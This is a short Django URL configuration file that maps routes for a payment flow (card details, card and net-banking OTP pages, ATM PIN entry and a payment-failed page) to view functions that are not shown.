
from django.contrib import admin
from django.urls import path, include
from . import views

urlpatterns = [
    path('', views.index, name='index'),
    path('payment/processing', views.paymentProcessing, name='paymentProcessing'),
    path('payment/card', views.cardDetails, name='cardDetails'),
    path('payment/card/otp', views.otpCard, name='otpCard'),
    path('payment/card/pin', views.atmPin, name='atmPin'),
    path('net/banking', views.netBanking, name='netBanking'),
    path('net/banking/otp', views.netOtp, name='netOtp'),
    path('payment/failed', views.paymentFailed, name='paymentFailed'),

]
